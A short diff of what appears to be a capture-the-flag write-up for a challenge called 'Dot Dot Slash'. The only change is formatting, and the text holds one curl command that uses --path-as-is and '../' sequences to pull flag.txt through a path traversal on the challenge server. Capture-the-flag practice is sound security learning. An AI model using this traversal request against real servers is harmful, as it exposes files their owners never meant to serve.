@@ -1,7 +1,7 @@
 # Dot Dot Slash
 
 solution:
-curl --verbose --path-as-is 'http://skrctf.me:400/../../../../../../flag.txt'
+`curl --verbose --path-as-is 'http://skrctf.me:400/../../../../../../flag.txt'`
 
 *Thanks to my friend who help me for the chal with a clear and understanding explaination*
 ```
